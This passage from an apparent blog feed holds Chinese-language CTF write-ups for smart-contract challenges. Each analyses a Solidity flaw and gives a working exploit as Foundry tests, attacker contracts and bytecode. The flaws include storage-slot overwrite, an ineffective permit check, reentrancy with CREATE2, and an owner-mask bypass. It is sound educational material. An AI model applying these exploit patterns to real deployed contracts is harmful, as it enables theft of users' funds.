0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/06.challenge/Storage1.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    Storage1 storage1;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        storage1 = new Storage1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        // 修改slot1的数据为我们的攻击合约地址，也就是修改admin</span><br><span class="line">        storage1.setLogicContract(bytes32(uint256(1)), address(this));</span><br><span class="line">        assertEq(storage1.admin(),address(this));</span><br><span class="line">        // 计算这个合约的余额存放的位置</span><br><span class="line">        bytes32 setGasDeposits = keccak256(abi.encode(address(this), 2));</span><br><span class="line">        // 修改余额</span><br><span class="line">        storage1.setLogicContract(setGasDeposits, address(9999999999999999999999999999999999));</span><br><span class="line">        storage1.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.challenge</title>
      <link href="/2023/07/28/16.CBSC%20CTF%202022/05.challenge/"/>
      <url>/2023/07/28/16.CBSC%20CTF%202022/05.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="05-challenge"><a href="#05-challenge" class="headerlink" title="05.challenge"></a>05.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>三个合约：</p><ul><li>MockWETH：普通的ERC20代币</li><li>MocksWETH：本身也是一个ERC20代币，并且拥有Permit功能，并且添加了一个普通的ERC20代币作为underlyingToken</li><li>LostAssets：初始化题目</li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将LostAssets合约的WETH设置为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function isComplete() public view returns (bool) &#123;</span><br><span class="line">    require(WETH.balanceOf(address(this)) == 0);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>主要的是理解WETH、sWETH、LostAssets之间的授权关系，明白授权、转账时候的msg.sender是谁，资产情况如何。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract LostAssets &#123;</span><br><span class="line">    MockWETH public WETH;</span><br><span class="line">    MocksWETH public sWETH;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;At least 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">        WETH = new MockWETH();</span><br><span class="line">        sWETH = new MocksWETH(address(WETH));</span><br><span class="line"></span><br><span class="line">        // WETH资产：LostAssets获得msg.value的WETH</span><br><span class="line">        WETH.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        // WETH资产：LostAssets 授权给 sWETH合约</span><br><span class="line">        WETH.approve(address(sWETH), type(uint256).max);</span><br><span class="line">        // sWETH: LostAssets 将资产从WETH换成sWETH</span><br><span class="line">        // 因为msg.sender是 LostAssets ，因此可以操作成功</span><br><span class="line">        // 这里已经操作了一半的资产，因此还有0.5ether可以操作</span><br><span class="line">        sWETH.deposit(msg.value / 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将LostAssets合约的WETH设置为0</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        require(WETH.balanceOf(address(this)) == 0);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WETH没有<code>permit()</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 链下签名： 将资产从WETH换成sWETH</span><br><span class="line">function depositWithPermit(</span><br><span class="line">    address target,</span><br><span class="line">    uint256 value,</span><br><span class="line">    uint256 deadline,</span><br><span class="line">    uint8 v,</span><br><span class="line">    bytes32 r,</span><br><span class="line">    bytes32 s,</span><br><span class="line">    address to</span><br><span class="line">) external returns (uint256) &#123;</span><br><span class="line">    // underlying即WETH，没有这个方法，因此去到fallback()而不会检验，相当于啥也没写</span><br><span class="line">    IERC20Permit(underlying).permit(target,address(this),value,deadline, v,r,s);</span><br><span class="line">    // 因为有个已经执行过的操作：      WETH资产：LostAssets 授权给 sWETH合约</span><br><span class="line">    // 因此sWETH合约可以用transferFrom()来操作 LostAssets 的WETH资产</span><br><span class="line">    // 因为上面的代码形同虚设，因此任何人都可以使用此方法</span><br><span class="line">    IERC20(underlying).safeTransferFrom(target, address(this), value);</span><br><span class="line">    return _deposit(value, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>permit()</code>没用，因此参数除了target必须填写lostAssets，其他随便填</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/05.challenge/LostAssets.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    LostAssets lostAssets;</span><br><span class="line">    MockWETH public WETH;</span><br><span class="line">    MocksWETH public sWETH;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        lostAssets = new LostAssets&#123;value: 1 ether&#125;();</span><br><span class="line">        WETH = lostAssets.WETH();</span><br><span class="line">        sWETH = lostAssets.sWETH();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        sWETH.depositWithPermit(address(lostAssets), 0.5 ether, 99999999999, 1, 0x00, 0x00, address(this));</span><br><span class="line">        assertEq(lostAssets.isComplete(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.challenge</title>
      <link href="/2023/07/28/16.CBSC%20CTF%202022/04.challenge/"/>
      <url>/2023/07/28/16.CBSC%20CTF%202022/04.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="04-challenge"><a href="#04-challenge" class="headerlink" title="04.challenge"></a>04.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>看似给了很多合约，其实很少：</p><ul><li>除了OwnerBuy之外的所有合约：ERC20标准</li><li>OwnerBuy<ul><li>继承了ERC20标准</li><li>拥有白名单机制</li><li>修改owner机制</li><li>买卖代币</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>我们至少将Time设置为100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function finish() public onlyOwner returns (bool) &#123;</span><br><span class="line">    require(Times[msg.sender] &gt;= 100);</span><br><span class="line">    Times[msg.sender] = 0;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">    emit finished(true);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>挺常见的场景，主要涉及：CREATE2，重入，“电梯方法”（也就是同个方法调用两次返回不同结果），白名单与阈值，自毁强制打钱，多用户薅羊毛。其实就是不断的满足买卖的限制条件然后进行重入即可。大概思路如下：</p><ol><li>成为owner并设置_owner</li><li>薅羊毛并且转钱到攻击合约</li><li>强制打钱到题目合约</li><li>重入</li><li>再次成为owner</li><li>完成题目</li></ol><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>代码有点多，有兴趣的话请查看我的GitHub，这里放出部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity 0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./bytecode.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test&#123;</span><br><span class="line">    IOwnerBuy public ownerbuy;</span><br><span class="line">    // 用remix获取attacker.sol的bytecode</span><br><span class="line">    bytes bytecode = BYTECODE;</span><br><span class="line">    bytes32 bytecodeHash = 0x3441600f3121d3cc8960a9230b29772dc5ad4318ec5a1768296869a7c6821001;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public &#123;</span><br><span class="line">        // 用户0x5B38Da6a701c568545dCfcB03FcB875f56beddC4来进行攻击</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(1 ether); // 给点钱，否则无法buy()</span><br><span class="line">        vm.startPrank(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line">        vm.label(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), &quot;user&quot;); </span><br><span class="line"></span><br><span class="line">        // 部署攻击合约,注意要用solidity来计算！不要直接用网页上面的keccak256，因为要做一点abi格式化</span><br><span class="line">        // 需要用到脚本来计算salt，就不放在GitHub了，博客中关于CREATE2的内容中有可以自行找一下</span><br><span class="line">        IAttacker attackerAddress = IAttacker(payable(deploy(0x0000000000000000000000000000000000000000000000000000000000025884)));</span><br><span class="line">        vm.label(address(attackerAddress), &quot;attackerAddress&quot;);</span><br><span class="line"></span><br><span class="line">        // 攻击之前初始化</span><br><span class="line">        attackerAddress.init();</span><br><span class="line">        ownerbuy = IOwnerBuy(address(attackerAddress.ownerbuy()));</span><br><span class="line">        vm.label(address(ownerbuy), &quot;ownerbuy&quot;);</span><br><span class="line">        attackerAddress.beforeAttack&#123;value:1 wei&#125;();</span><br><span class="line"></span><br><span class="line">        // 使用三个Helper来获得空投满足条件</span><br><span class="line">        for(uint256 i = 0; i &lt; 4; i++)&#123;</span><br><span class="line">            Helper helper = new Helper(address(ownerbuy));</span><br><span class="line">            helper.buyAndTransfer&#123;value:10000 wei&#125;(address(attackerAddress));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        attackerAddress.Attack(); // 开始攻击</span><br><span class="line">        assertEq(address(ownerbuy).balance, 0); // 检查是否攻击成功</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes32 salt) public returns(address) &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        bytes memory _bytecode = bytecode;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(_bytecode, 0x20), mload(_bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    IOwnerBuy ownerbuy;</span><br><span class="line">    </span><br><span class="line">    constructor(address _addr) payable public&#123;</span><br><span class="line">        ownerbuy = IOwnerBuy(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function buyAndTransfer(address _addr) public payable &#123;</span><br><span class="line">        ownerbuy.buy&#123;value: 1 wei&#125;(); // 获得100元</span><br><span class="line">        ownerbuy.transfer(_addr,100); // 转给攻击合约地址</span><br><span class="line">        selfdestruct(payable(address(ownerbuy))); // sell()的时候ownerbuy需要钱才能调用</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IOwnerBuy&#123;</span><br><span class="line">    function buy() external payable returns (bool);</span><br><span class="line">    function sell(uint256) external returns (bool );</span><br><span class="line">    function finish() external  returns (bool);</span><br><span class="line">    function changeOwner() external;</span><br><span class="line">    function changestatus(address) external;</span><br><span class="line">    function transferOwnership(address) external;</span><br><span class="line">    function transfer(address, uint256) external returns (bool);</span><br><span class="line">    function _owner() external returns(address);</span><br><span class="line">    function balanceOf(address ) external view returns (uint256);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IAttacker&#123;</span><br><span class="line">    function ownerbuy() external view returns(address);</span><br><span class="line">    function init() external;</span><br><span class="line">    function beforeAttack() external payable;</span><br><span class="line">    function Attack() external;</span><br><span class="line">    function isOwner(address ) external returns(bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.challenge</title>
      <link href="/2023/07/27/16.CBSC%20CTF%202022/03.challenge/"/>
      <url>/2023/07/27/16.CBSC%20CTF%202022/03.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="03-challenge"><a href="#03-challenge" class="headerlink" title="03.challenge"></a>03.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-大局观"><a href="#1-大局观" class="headerlink" title="1.大局观"></a>1.大局观</h3><p>两个代码：</p><ul><li>MerkleProof：merkle树的验证方法</li><li>Merkle<ul><li>一开始拥有1ether，如果用户位于merkle树的白名单里面则可以一次去完1ether</li><li>可修改root，但是有条件</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将合约中的余额归零</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Complete() external &#123;</span><br><span class="line">    require(address(this).balance == 0);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>只要我们位于白名单中就可以取完所有钱，但是我们不位于白名单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(bytes32[] memory proof,address to) public returns(bool)&#123;</span><br><span class="line">    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));</span><br><span class="line">    require(MerkleProof.verify(proof, merkleRoot, leaf), &quot;Merkle Proof Verification failed&quot;);</span><br><span class="line">    uint balance = address(this).balance;</span><br><span class="line">    // 这里的amount没啥用，因为balnace一定是大于amount的，将本合约中的所有钱给到to地址</span><br><span class="line">    payable(to).transfer(min(amount,balance));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个方法可以修改root，但是又onlyOwner修饰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function setMerkleroot(bytes32 _merkleroot) external onlyOwner &#123; </span><br><span class="line">    merkleRoot = _merkleroot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要调用者地址的第一个高字节和owner一样即可，那么用CREATE2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner() &#123;</span><br><span class="line">    require(mask &amp; bytes20(msg.sender) == mask &amp; bytes20(owner));</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用攻击合约来解题（用CREATE2生成），修改root，然后就可以调用<code>withdraw()</code>取钱</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity 0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/03.challenge/Merkle.sol&quot;;</span><br><span class="line">import &quot;./attacker.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test&#123;</span><br><span class="line">    Merkle merkle;</span><br><span class="line">    // cast keccak &#x27;bytecode&#x27;</span><br><span class="line">    bytes32 bytecodeHash = 0x37a91fae53b9e4048c07a4cc8f040a3f5824539c74f18f400380edd62c7debdc;</span><br><span class="line">    // 用remix获取attacker.sol的bytecode</span><br><span class="line">    bytes bytecode = hex&quot;608060405234801561001057600080fd5b50610813806100206000396000f3fe6080604052600436106100435760003560e01c806319ab453c146100465780632813139a1461006f57806361ce5e66146100795780636b6d34341461009057610044565b5b005b34801561005257600080fd5b5061006d6004803603810190610068919061048b565b6100a7565b005b6100776100f2565b005b34801561008557600080fd5b5061008e610181565b005b34801561009c57600080fd5b506100a56102b9565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506100ef6102b9565b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166392f6c4396001546040518263ffffffff1660e01b815260040161014d91906104d1565b600060405180830381600087803b15801561016757600080fd5b505af115801561017b573d6000803e3d6000fd5b50505050565b6000600267ffffffffffffffff81111561019e5761019d6104ec565b5b6040519080825280602002602001820160405280156101cc5781602001602082028036833780820191505090505b5090506000801b816000815181106101e7576101e661051b565b5b6020026020010181815250506000801b8160018151811061020b5761020a61051b565b5b60200260200101818152505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166338be559282306040518363ffffffff1660e01b8152600401610272929190610617565b6020604051808303816000875af1158015610291573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102b5919061067f565b5050565b6000600267ffffffffffffffff8111156102d6576102d56104ec565b5b6040519080825280602002602001820160405280156103045781602001602082028036833780820191505090505b5090506000801b8160008151811061031f5761031e61051b565b5b6020026020010181815250506000801b816001815181106103435761034261051b565b5b60200260200101818152505060003060405160200161036291906106f4565b60405160208183030381529060405280519060200120905060005b825181101561041c57600083828151811061039b5761039a61051b565b5b602002602001015190508083116103dc5782816040516020016103bf929190610730565b604051602081830303815290604052805190602001209250610408565b80836040516020016103ef929190610730565b6040516020818303038152906040528051906020012092505b50808061041490610795565b91505061037d565b50806001819055505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104588261042d565b9050919050565b6104688161044d565b811461047357600080fd5b50565b6000813590506104858161045f565b92915050565b6000602082840312156104a1576104a0610428565b5b60006104af84828501610476565b91505092915050565b6000819050919050565b6104cb816104b8565b82525050565b60006020820190506104e660008301846104c2565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b61057f816104b8565b82525050565b60006105918383610576565b60208301905092915050565b6000602082019050919050565b60006105b58261054a565b6105bf8185610555565b93506105ca83610566565b8060005b838110156105fb5781516105e28882610585565b97506105ed8361059d565b9250506001810190506105ce565b5085935050505092915050565b6106118161044d565b82525050565b6000604082019050818103600083015261063181856105aa565b90506106406020830184610608565b9392505050565b60008115159050919050565b61065c81610647565b811461066757600080fd5b50565b60008151905061067981610653565b92915050565b60006020828403121561069557610694610428565b5b60006106a38482850161066a565b91505092915050565b60008160601b9050919050565b60006106c4826106ac565b9050919050565b60006106d6826106b9565b9050919050565b6106ee6106e98261044d565b6106cb565b82525050565b600061070082846106dd565b60148201915081905092915050565b6000819050919050565b61072a610725826104b8565b61070f565b82525050565b600061073c8285610719565b60208201915061074c8284610719565b6020820191508190509392505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006107a08261078b565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036107d2576107d161075c565b5b60018201905091905056fea26469706673582212206cb3c7ca447ae9e793f89ed957e69da3781e83859f2d8a6c29d8b9ac301ccf0264736f6c634300080d0033&quot;;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        // 随便搞个题目复现</span><br><span class="line">        // 注意，这里进行调用的msg.sender是此合约的地址0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496，</span><br><span class="line">        // 而不是msg.sender0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38</span><br><span class="line">        // 因此merkle的owner初始化为0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        merkle =  new Merkle&#123;value: 1 ether&#125;(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public &#123;</span><br><span class="line">        // 用户0x5B38Da6a701c568545dCfcB03FcB875f56beddC4来进行攻击</span><br><span class="line">        vm.startPrank(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;[before]&quot;,merkle.balanceOf());</span><br><span class="line"></span><br><span class="line">        // 我们用脚本计算出来的salt</span><br><span class="line">        attacker attackerAddress = attacker(payable(deploy(0x0000000000000000000000000000000000000000000000000000000000000349)));</span><br><span class="line">        attackerAddress.init(address(merkle));</span><br><span class="line">        attackerAddress.step01_setRoot();</span><br><span class="line">        attackerAddress.step02_attack();</span><br><span class="line"></span><br><span class="line">        merkle.Complete();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;[after]&quot;,merkle.balanceOf());</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes32 salt) public returns(address) &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        bytes memory _bytecode = bytecode;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(_bytecode, 0x20), mload(_bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>attacker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.13;</span><br><span class="line"></span><br><span class="line">contract attacker&#123;</span><br><span class="line"></span><br><span class="line">    IMerkle merk;</span><br><span class="line">    bytes32 root;</span><br><span class="line">    </span><br><span class="line">    function init(address _addr)public&#123;</span><br><span class="line">        merk = IMerkle(_addr);</span><br><span class="line">        calculateRoot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step01_setRoot()public payable&#123;</span><br><span class="line">        merk.setMerkleroot(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step02_attack()public &#123;</span><br><span class="line">        bytes32[] memory proof = new bytes32[](2);</span><br><span class="line">        proof[0] = 0x0000000000000000000000000000000000000000000000000000000000000000;</span><br><span class="line">        proof[1] = 0x0000000000000000000000000000000000000000000000000000000000000000;</span><br><span class="line">        merk.withdraw(proof, address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calculateRoot() public&#123;</span><br><span class="line">        bytes32[] memory proof = new bytes32[](2);</span><br><span class="line">        proof[0] = 0x0000000000000000000000000000000000000000000000000000000000000000;</span><br><span class="line">        proof[1] = 